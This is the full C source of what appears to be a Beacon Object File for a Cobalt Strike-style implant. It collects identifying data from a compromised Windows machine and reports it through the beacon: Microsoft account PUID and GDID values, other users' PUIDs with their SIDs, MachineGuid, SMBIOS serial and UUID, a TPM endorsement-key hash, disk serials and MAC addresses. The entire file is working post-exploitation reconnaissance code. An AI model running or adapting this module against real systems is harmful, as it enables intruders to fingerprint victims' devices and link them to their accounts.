#include <windows.h>
#include <winioctl.h>
#include <stdint.h>
#include "beacon.h"

#ifndef LSTATUS
typedef LONG LSTATUS;
#endif
#ifndef KEY_WOW64_64KEY
#define KEY_WOW64_64KEY 0x0100
#endif

typedef LONG NTSTATUS;
typedef LONG SECURITY_STATUS;
typedef ULONG_PTR NCRYPT_HANDLE;
typedef ULONG_PTR NCRYPT_PROV_HANDLE;
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_HASH_HANDLE;

#define BCRYPT_SHA256_ALGORITHM L"SHA256"
#define NCRYPT_PCP_EKPUB_PROPERTY L"PCP_EKPUB"
#define MS_PLATFORM_CRYPTO_PROVIDER L"Microsoft Platform Crypto Provider"

#define AF_UNSPEC 0
#define GAA_FLAG_SKIP_ANYCAST 0x0002
#define GAA_FLAG_SKIP_MULTICAST 0x0004
#define GAA_FLAG_SKIP_DNS_SERVER 0x0008
#define IF_TYPE_ETHERNET_CSMACD 6
#define IF_TYPE_IEEE80211 71

#define SMBIOS_PROVIDER 0x52534D42u /* 'RSMB' */

#ifndef IOCTL_STORAGE_QUERY_PROPERTY
#define IOCTL_STORAGE_QUERY_PROPERTY 0x002D1400
#endif
#ifndef ERROR_BUFFER_OVERFLOW
#define ERROR_BUFFER_OVERFLOW 111
#endif

typedef struct _MY_IP_ADAPTER_ADDRESSES
{
    union
    {
        ULONGLONG Alignment;
        struct
        {
            ULONG Length;
            DWORD IfIndex;
        };
    };
    struct _MY_IP_ADAPTER_ADDRESSES *Next;
    PCHAR AdapterName;
    PVOID FirstUnicastAddress;
    PVOID FirstAnycastAddress;
    PVOID FirstMulticastAddress;
    PVOID FirstDnsServerAddress;
    PWCHAR DnsSuffix;
    PWCHAR Description;
    PWCHAR FriendlyName;
    BYTE PhysicalAddress[8];
    DWORD PhysicalAddressLength;
    DWORD Flags;
    DWORD Mtu;
    DWORD IfType;
} MY_IP_ADAPTER_ADDRESSES;

DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegCloseKey(HKEY);

DECLSPEC_IMPORT UINT WINAPI Kernel32$GetSystemFirmwareTable(DWORD, DWORD, PVOID, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI Kernel32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI Kernel32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI Kernel32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI Kernel32$GetLastError(void);
DECLSPEC_IMPORT HLOCAL WINAPI Kernel32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI Kernel32$LocalFree(HLOCAL);
DECLSPEC_IMPORT int WINAPI Kernel32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI Ncrypt$NCryptOpenStorageProvider(NCRYPT_PROV_HANDLE *, LPCWSTR, DWORD);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI Ncrypt$NCryptGetProperty(NCRYPT_HANDLE, LPCWSTR, PBYTE, DWORD, PDWORD, DWORD);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI Ncrypt$NCryptFreeObject(NCRYPT_HANDLE);

DECLSPEC_IMPORT NTSTATUS WINAPI Bcrypt$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI Bcrypt$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI Bcrypt$BCryptCreateHash(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI Bcrypt$BCryptHashData(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI Bcrypt$BCryptFinishHash(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI Bcrypt$BCryptDestroyHash(BCRYPT_HASH_HANDLE);

DECLSPEC_IMPORT ULONG WINAPI Iphlpapi$GetAdaptersAddresses(ULONG, ULONG, PVOID, MY_IP_ADAPTER_ADDRESSES *, PULONG);

#define IDCRL_EXTPROPS L"SOFTWARE\\Microsoft\\IdentityCRL\\ExtendedProperties"
#define IDCRL_ROOT L"SOFTWARE\\Microsoft\\IdentityCRL"
#define IDCRL_NEGCACHE L"SOFTWARE\\Microsoft\\IdentityCRL\\NegativeCache"
#define CRYPTO_KEY L"SOFTWARE\\Microsoft\\Cryptography"
#define SQM_KEY L"SOFTWARE\\Microsoft\\SQMClient"

static int parse_hex64(const wchar_t *s, uint64_t *out)
{
    if (!s || !*s)
        return 0;
    uint64_t v = 0;
    for (int n = 0; *s && n < 16; ++s, ++n)
    {
        wchar_t c = *s;
        uint64_t d;
        if (c >= L'0' && c <= L'9')
            d = c - L'0';
        else if (c >= L'a' && c <= L'f')
            d = c - L'a' + 10;
        else if (c >= L'A' && c <= L'F')
            d = c - L'A' + 10;
        else
            return 0;
        v = (v << 4) | d;
    }
    *out = v;
    return 1;
}

static void u64_to_dec(uint64_t v, char *buf)
{
    char tmp[21];
    int i = 0;
    if (v == 0)
    {
        buf[0] = '0';
        buf[1] = 0;
        return;
    }
    while (v > 0)
    {
        tmp[i++] = (char)('0' + (v % 10));
        v /= 10;
    }
    int j = 0;
    while (i > 0)
        buf[j++] = tmp[--i];
    buf[j] = 0;
}

static void bytes_to_hex(const BYTE *b, size_t n, char *out)
{
    static const char h[] = "0123456789abcdef";
    for (size_t i = 0; i < n; ++i)
    {
        out[i * 2] = h[b[i] >> 4];
        out[i * 2 + 1] = h[b[i] & 0xf];
    }
    out[n * 2] = 0;
}

static void wide_to_utf8(const wchar_t *w, char *out, int cb)
{
    if (!w)
    {
        out[0] = 0;
        return;
    }
    int r = Kernel32$WideCharToMultiByte(CP_UTF8, 0, w, -1, out, cb, NULL, NULL);
    if (r <= 0)
    {
        out[0] = '?';
        out[1] = 0;
    }
}

static BOOL reg_read_sz(HKEY root, LPCWSTR sk, LPCWSTR vn,
                        wchar_t *out, DWORD out_cch)
{
    HKEY hk;
    if (Advapi32$RegOpenKeyExW(root, sk, 0, KEY_READ | KEY_WOW64_64KEY, &hk) != ERROR_SUCCESS)
        return FALSE;

    DWORD type = 0, cb = out_cch * (DWORD)sizeof(wchar_t);
    LSTATUS rc = Advapi32$RegQueryValueExW(hk, vn, NULL, &type, (LPBYTE)out, &cb);
    Advapi32$RegCloseKey(hk);

    if (rc != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ))
        return FALSE;

    DWORD cch = cb / (DWORD)sizeof(wchar_t);
    if (cch == 0 || out[cch - 1] != L'\0')
        out[cch >= out_cch ? out_cch - 1 : cch] = L'\0';
    return TRUE;
}

static void print_reg(const char *label, HKEY root, LPCWSTR sk, LPCWSTR vn)
{
    wchar_t w[512];
    char a[768];
    if (reg_read_sz(root, sk, vn, w, 512))
    {
        wide_to_utf8(w, a, sizeof(a));
        BeaconPrintf(CALLBACK_OUTPUT, "    %-28s : %s", label, a);
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "    %-28s : <not readable>", label);
    }
}

static void print_gdid(void)
{
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Passport Unique ID  (HKCU\\SOFTWARE\\Microsoft\\IdentityCRL\\ExtendedProperties\\LID)");

    wchar_t lid_w[64];
    if (!reg_read_sz(HKEY_CURRENT_USER, IDCRL_EXTPROPS, L"LID", lid_w, 64))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "    [-] absent (wlidsvc has not provisioned this user)");
        return;
    }

    uint64_t puid;
    if (!parse_hex64(lid_w, &puid))
    {
        char err[128];
        wide_to_utf8(lid_w, err, sizeof(err));
        BeaconPrintf(CALLBACK_OUTPUT, "    [-] LID not 16-hex: %s", err);
        return;
    }

    char lid_a[64], dec[24];
    wide_to_utf8(lid_w, lid_a, sizeof(lid_a));
    u64_to_dec(puid, dec);

    unsigned ns = (unsigned)(puid >> 48);
    const char *kind = ns == 0x0018   ? "device PUID"
                       : ns == 0x0003 ? "user PUID"
                                      : "unknown class";

    BeaconPrintf(CALLBACK_OUTPUT, "    LID (hex)            : %s", lid_a);
    BeaconPrintf(CALLBACK_OUTPUT, "    PUID (dec)           : %s", dec);
    BeaconPrintf(CALLBACK_OUTPUT, "    Namespace            : 0x%04X (%s)", ns, kind);
    BeaconPrintf(CALLBACK_OUTPUT, "    GDID                 : g:%s", dec);
}

static void print_neighbours(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, " ");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Neighbouring identifiers");
    print_reg("MachineGuid", HKEY_LOCAL_MACHINE, CRYPTO_KEY, L"MachineGuid");
    print_reg("SQM MachineId", HKEY_LOCAL_MACHINE, SQM_KEY, L"MachineId");
    print_reg("IDCRL version", HKEY_LOCAL_MACHINE, IDCRL_ROOT, L"IDCRLVersion");
    print_reg("Login URL", HKEY_LOCAL_MACHINE, IDCRL_ROOT, L"LoginUrl");
    print_reg("Device DNS suffix", HKEY_LOCAL_MACHINE, IDCRL_ROOT, L"DeviceDNSSuffix");
}

static void enum_user_puids(void)
{
    HKEY hk;
    if (Advapi32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, IDCRL_NEGCACHE, 0,
                               KEY_READ | KEY_WOW64_64KEY, &hk) != ERROR_SUCCESS)
        return;

    BeaconPrintf(CALLBACK_OUTPUT, " ");
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] User PUIDs  (HKLM\\SOFTWARE\\Microsoft\\IdentityCRL\\NegativeCache)");

    for (DWORD i = 0;; ++i)
    {
        wchar_t name[512];
        DWORD cch = 512;
        LSTATUS rc = Advapi32$RegEnumKeyExW(hk, i, name, &cch, NULL, NULL, NULL, NULL);
        if (rc == ERROR_NO_MORE_ITEMS || rc != ERROR_SUCCESS)
            break;

        int us = -1;
        for (int k = 0; name[k] && k < 512; ++k)
        {
            if (name[k] == L'_')
            {
                us = k;
                break;
            }
        }
        if (us != 16)
            continue;

        wchar_t hex_w[17];
        for (int k = 0; k < 16; ++k)
            hex_w[k] = name[k];
        hex_w[16] = L'\0';

        uint64_t p;
        if (!parse_hex64(hex_w, &p))
            continue;

        char hex_a[24], sid_a[300], dec[24];
        wide_to_utf8(hex_w, hex_a, sizeof(hex_a));
        wide_to_utf8(name + 17, sid_a, sizeof(sid_a));
        u64_to_dec(p, dec);

        BeaconPrintf(CALLBACK_OUTPUT, "    %s  dec=%s  sid=%s", hex_a, dec, sid_a);
    }
    Advapi32$RegCloseKey(hk);
}

#pragma pack(push, 1)
typedef struct
{
    BYTE Type;
    BYTE Length;
    WORD Handle;
} SMBIOS_HDR;
typedef struct
{
    SMBIOS_HDR H;
    BYTE Manufacturer, ProductName, Version, SerialNumber;
    BYTE Uuid[16];
    BYTE WakeUpType, SkuNumber, Family;
} SMBIOS_T1;
#pragma pack(pop)

static const char *smbios_str(const BYTE *strs, BYTE idx)
{
    if (idx == 0)
        return "";
    const char *p = (const char *)strs;
    for (BYTE i = 1; i < idx; ++i)
    {
        while (*p)
            ++p;
        ++p;
        if (*p == '\0')
            return "";
    }
    return p;
}

static void smbios_uuid(const BYTE u[16], char *out)
{
    static const char h[] = "0123456789ABCDEF";
    const BYTE order[16] = {3, 2, 1, 0, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15};
    const BYTE dashes[16] = {0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0};
    int j = 0;
    for (int i = 0; i < 16; ++i)
    {
        BYTE b = u[order[i]];
        out[j++] = h[b >> 4];
        out[j++] = h[b & 0xf];
        if (dashes[i])
            out[j++] = '-';
    }
    out[j] = 0;
}

static void print_smbios(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, " ");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SMBIOS  (GetSystemFirmwareTable 'RSMB')");

    DWORD cb = Kernel32$GetSystemFirmwareTable(SMBIOS_PROVIDER, 0, NULL, 0);
    if (cb == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "    [-] GetSystemFirmwareTable failed: %lu",
                     Kernel32$GetLastError());
        return;
    }

    BYTE *buf = (BYTE *)Kernel32$LocalAlloc(0x40, cb); /* LPTR */
    if (!buf)
        return;
    if (Kernel32$GetSystemFirmwareTable(SMBIOS_PROVIDER, 0, buf, cb) == 0)
    {
        Kernel32$LocalFree(buf);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "    SMBIOS version       : %u.%u", buf[1], buf[2]);

    const BYTE *p = buf + 8;
    const BYTE *end = buf + cb;
    while (p + sizeof(SMBIOS_HDR) <= end)
    {
        const SMBIOS_HDR *h = (const SMBIOS_HDR *)p;
        if (h->Length < sizeof(SMBIOS_HDR))
            break;

        if (h->Type == 1 && h->Length >= sizeof(SMBIOS_T1))
        {
            const SMBIOS_T1 *t = (const SMBIOS_T1 *)h;
            const BYTE *strs = p + h->Length;
            char uuid[40];
            smbios_uuid(t->Uuid, uuid);
            BeaconPrintf(CALLBACK_OUTPUT, "    Manufacturer  (4097) : %s", smbios_str(strs, t->Manufacturer));
            BeaconPrintf(CALLBACK_OUTPUT, "    Product       (4099) : %s", smbios_str(strs, t->ProductName));
            BeaconPrintf(CALLBACK_OUTPUT, "    Version       (4100) : %s", smbios_str(strs, t->Version));
            BeaconPrintf(CALLBACK_OUTPUT, "    Serial number (4101) : %s", smbios_str(strs, t->SerialNumber));
            BeaconPrintf(CALLBACK_OUTPUT, "    UUID          (4102) : %s", uuid);
            BeaconPrintf(CALLBACK_OUTPUT, "    SKU                  : %s", smbios_str(strs, t->SkuNumber));
            BeaconPrintf(CALLBACK_OUTPUT, "    Family               : %s", smbios_str(strs, t->Family));
        }
        if (h->Type == 127)
            break;

        const BYTE *q = p + h->Length;
        while (q + 1 < end && (q[0] || q[1]))
            ++q;
        p = q + 2;
    }
    Kernel32$LocalFree(buf);
}

static int sha256_bcrypt(const BYTE *in, DWORD cb, BYTE out[32])
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int ok = 0;

    if (Bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) < 0)
        return 0;
    if (Bcrypt$BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) < 0)
        goto done;
    if (Bcrypt$BCryptHashData(hHash, (PUCHAR)in, cb, 0) < 0)
        goto done;
    if (Bcrypt$BCryptFinishHash(hHash, out, 32, 0) < 0)
        goto done;
    ok = 1;
done:
    if (hHash)
        Bcrypt$BCryptDestroyHash(hHash);
    if (hAlg)
        Bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

static void print_tpm(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, " ");
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] TPM Endorsement Key  (Microsoft Platform Crypto Provider)");

    NCRYPT_PROV_HANDLE hProv = 0;
    SECURITY_STATUS ss = Ncrypt$NCryptOpenStorageProvider(&hProv,
                                                          MS_PLATFORM_CRYPTO_PROVIDER, 0);
    if (ss != 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    [-] Platform Crypto Provider not available (0x%08X)", (unsigned)ss);
        return;
    }

    DWORD cb = 0;
    ss = Ncrypt$NCryptGetProperty(hProv, NCRYPT_PCP_EKPUB_PROPERTY, NULL, 0, &cb, 0);
    if (ss != 0 || cb == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    [-] EKPub property not present (0x%08X)", (unsigned)ss);
        Ncrypt$NCryptFreeObject(hProv);
        return;
    }

    BYTE *blob = (BYTE *)Kernel32$LocalAlloc(0x40, cb);
    if (!blob)
    {
        Ncrypt$NCryptFreeObject(hProv);
        return;
    }

    ss = Ncrypt$NCryptGetProperty(hProv, NCRYPT_PCP_EKPUB_PROPERTY, blob, cb, &cb, 0);
    Ncrypt$NCryptFreeObject(hProv);
    if (ss != 0)
    {
        Kernel32$LocalFree(blob);
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    [-] NCryptGetProperty(EKPub) failed (0x%08X)", (unsigned)ss);
        return;
    }

    BYTE digest[32];
    if (sha256_bcrypt(blob, cb, digest))
    {
        char hex[65];
        bytes_to_hex(digest, 32, hex);
        BeaconPrintf(CALLBACK_OUTPUT, "    EKPub blob size      : %lu bytes", cb);
        BeaconPrintf(CALLBACK_OUTPUT, "    EKPub SHA-256        : %s", hex);
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "    [-] SHA-256 failed");
    }
    Kernel32$LocalFree(blob);
}

typedef struct
{
    DWORD PropertyId;
    DWORD QueryType;
    BYTE AdditionalParameters[1];
} MY_STORAGE_PROPERTY_QUERY;

typedef struct
{
    DWORD Version;
    DWORD Size;
} MY_STORAGE_DESCRIPTOR_HEADER;

typedef struct
{
    DWORD Version;
    DWORD Size;
    BYTE DeviceType;
    BYTE DeviceTypeModifier;
    BOOLEAN RemovableMedia;
    BOOLEAN CommandQueueing;
    DWORD VendorIdOffset;
    DWORD ProductIdOffset;
    DWORD ProductRevisionOffset;
    DWORD SerialNumberOffset;
} MY_STORAGE_DEVICE_DESCRIPTOR;

#define STORAGE_DEVICE_PROPERTY 0
#define PROPERTY_STANDARD_QUERY 0

static void print_disks(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, " ");
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Physical disks  (IOCTL_STORAGE_QUERY_PROPERTY)");

    for (int idx = 0; idx < 32; ++idx)
    {
        wchar_t path[64] = L"\\\\.\\PhysicalDrive";
        int base = 17;
        if (idx < 10)
        {
            path[base] = L'0' + idx;
            path[base + 1] = L'\0';
        }
        else
        {
            path[base] = L'0' + (idx / 10);
            path[base + 1] = L'0' + (idx % 10);
            path[base + 2] = L'\0';
        }

        HANDLE h = Kernel32$CreateFileW(path, 0,
                                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                                        NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE)
        {
            if (Kernel32$GetLastError() == ERROR_FILE_NOT_FOUND)
                break;
            continue;
        }

        MY_STORAGE_PROPERTY_QUERY q = {STORAGE_DEVICE_PROPERTY, PROPERTY_STANDARD_QUERY, {0}};
        MY_STORAGE_DESCRIPTOR_HEADER hdr = {0, 0};
        DWORD n = 0;

        if (!Kernel32$DeviceIoControl(h, IOCTL_STORAGE_QUERY_PROPERTY,
                                      &q, sizeof(q), &hdr, sizeof(hdr), &n, NULL) ||
            hdr.Size < sizeof(MY_STORAGE_DEVICE_DESCRIPTOR))
        {
            Kernel32$CloseHandle(h);
            continue;
        }

        BYTE *desc = (BYTE *)Kernel32$LocalAlloc(0x40, hdr.Size);
        if (!desc)
        {
            Kernel32$CloseHandle(h);
            continue;
        }

        if (Kernel32$DeviceIoControl(h, IOCTL_STORAGE_QUERY_PROPERTY,
                                     &q, sizeof(q), desc, hdr.Size, &n, NULL))
        {
            MY_STORAGE_DEVICE_DESCRIPTOR *d = (MY_STORAGE_DEVICE_DESCRIPTOR *)desc;
            const char *serial = d->SerialNumberOffset ? (char *)desc + d->SerialNumberOffset : "";
            const char *vendor = d->VendorIdOffset ? (char *)desc + d->VendorIdOffset : "";
            const char *model = d->ProductIdOffset ? (char *)desc + d->ProductIdOffset : "";
            BeaconPrintf(CALLBACK_OUTPUT,
                         "    PhysicalDrive%d  serial=%s  vendor=%s  model=%s",
                         idx, serial, vendor, model);
        }
        Kernel32$LocalFree(desc);
        Kernel32$CloseHandle(h);
    }
}

static const char *iftype_label(DWORD t)
{
    switch (t)
    {
    case IF_TYPE_ETHERNET_CSMACD:
        return "eth";
    case IF_TYPE_IEEE80211:
        return "wifi";
    default:
        return "other";
    }
}

static void print_macs(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, " ");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] MAC addresses  (GetAdaptersAddresses)");

    ULONG cb = 15 * 1024;
    MY_IP_ADAPTER_ADDRESSES *buf = (MY_IP_ADAPTER_ADDRESSES *)Kernel32$LocalAlloc(0x40, cb);
    if (!buf)
        return;

    ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER;
    ULONG rc = Iphlpapi$GetAdaptersAddresses(AF_UNSPEC, flags, NULL, buf, &cb);
    if (rc == ERROR_BUFFER_OVERFLOW)
    {
        Kernel32$LocalFree(buf);
        buf = (MY_IP_ADAPTER_ADDRESSES *)Kernel32$LocalAlloc(0x40, cb);
        if (!buf)
            return;
        rc = Iphlpapi$GetAdaptersAddresses(AF_UNSPEC, flags, NULL, buf, &cb);
    }
    if (rc != NO_ERROR)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "    [-] GetAdaptersAddresses failed: %lu", rc);
        Kernel32$LocalFree(buf);
        return;
    }

    for (MY_IP_ADAPTER_ADDRESSES *a = buf; a; a = a->Next)
    {
        if (a->PhysicalAddressLength != 6)
            continue;
        if (a->IfType != IF_TYPE_ETHERNET_CSMACD && a->IfType != IF_TYPE_IEEE80211)
            continue;
        const BYTE *m = a->PhysicalAddress;
        if ((m[0] | m[1] | m[2] | m[3] | m[4] | m[5]) == 0)
            continue;

        char name[256];
        wide_to_utf8(a->FriendlyName, name, sizeof(name));
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    %-5s  %02X:%02X:%02X:%02X:%02X:%02X  %s",
                     iftype_label(a->IfType),
                     m[0], m[1], m[2], m[3], m[4], m[5], name);
    }
    Kernel32$LocalFree(buf);
}

void go(char *args, int alen)
{
    (void)args;
    (void)alen;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Windows GDID + hardware descriptor report");
    print_gdid();
    print_neighbours();
    enum_user_puids();
    print_smbios();
    print_tpm();
    print_disks();
    print_macs();
}
